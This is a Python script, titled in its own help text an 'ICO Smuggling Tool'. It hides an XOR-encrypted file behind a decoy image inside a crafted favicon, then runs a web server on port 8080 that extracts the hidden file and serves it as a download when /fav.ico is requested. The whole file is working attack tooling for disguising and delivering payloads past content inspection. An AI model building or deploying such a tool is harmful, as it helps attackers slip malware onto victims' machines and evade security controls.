# @RandomDhiraj

from struct import pack, unpack
import os
import mimetypes
from http.server import HTTPServer, SimpleHTTPRequestHandler
import sys
import argparse

def xor_encrypt(data, key=0x55, chunk_size=1024):
    return bytes([b ^ key for b in data])

def create_payload_ico(payload, original_filename, output_file="fav.ico"):
    decoy_header = pack('<IIIHHIIIIII', 40, 16, 32, 1, 32, 0, 0, 0, 0, 0, 0)
    decoy_pixels = b'\xFF\xFF\xFF\xFF' * (16*16)
    decoy_icon = decoy_header + decoy_pixels
    
    filename_marker = b'\xAA\xBB\xCC\xDD'
    filename_data = original_filename.encode('utf-8')
    encrypted = xor_encrypt(payload + filename_marker + filename_data)
    
    # ICO structure Here
    header = pack('<HHH', 0, 1, 2)
    dir_entry_size = 16
    decoy_offset = 6 + (2 * dir_entry_size)
    
    dir1 = pack('<BBBBHHII', 16,16,0,0,1,32,len(decoy_icon),decoy_offset)
    dir2 = pack('<BBBBHHII', 16,16,0,0,1,32,len(encrypted)+8,decoy_offset+len(decoy_icon)+8)
    
    ico_data = (
        header + dir1 + dir2 +
        decoy_icon +
        pack('<I', len(encrypted)) + b'\x55\x55\x55\x55' +
        encrypted
    )
    
    with open(output_file, 'wb') as f:
        f.write(ico_data)
    print(f"Created {output_file} containing {original_filename}")

class SmuggleHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.lower() == "/fav.ico":
            try:
                with open("fav.ico", "rb") as f:
                    ico_data = f.read()
            
                payload_header = ico_data.find(b'\x55\x55\x55\x55') - 4
                if payload_header == -5:
                    self.send_error(500, "Invalid payload marker")
                    return
                
                payload_size = int.from_bytes(ico_data[payload_header:payload_header+4], 'little')
                encrypted = ico_data[payload_header+8:payload_header+8+payload_size]
                decrypted = xor_encrypt(encrypted)
                filename_marker = decrypted.find(b'\xAA\xBB\xCC\xDD')
                if filename_marker == -1:
                    self.send_error(500, "Filename marker missing")
                    return
                
                file_data = decrypted[:filename_marker]
                original_filename = decrypted[filename_marker+4:].decode('utf-8')
                ext = os.path.splitext(original_filename)[1].lower()
                
                mime_type, _ = mimetypes.guess_type(original_filename)
                if not mime_type:
                    mime_type = 'application/octet-stream'

                self.send_response(200)
                self.send_header('Content-Type', mime_type)
                self.send_header('Content-Disposition', 
                               f'attachment; filename="{original_filename}"')
                self.end_headers()
                self.wfile.write(file_data)
                print(f"Served {original_filename} as {mime_type}")
                
            except Exception as e:
                self.send_error(500, str(e))
        else:
            super().do_GET()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ICO Smuggling Tool')
    parser.add_argument('input_file', nargs='?', help='File to smuggle')
    parser.add_argument('-o', '--output', default='fav.ico', help='Output ICO file')
    
    args = parser.parse_args()

    if args.input_file:
        try:
            with open(args.input_file, 'rb') as f:
                payload = f.read()
            create_payload_ico(payload, 
                             os.path.basename(args.input_file),
                             args.output)
            print(f"Created {args.output} containing {args.input_file}")
        except Exception as e:
            print(f"Error: {str(e)}")
            sys.exit(1)
    
    server = HTTPServer(('', 8080), SmuggleHandler)
    print(f"Serving {args.output} on port 8080")
    server.serve_forever()
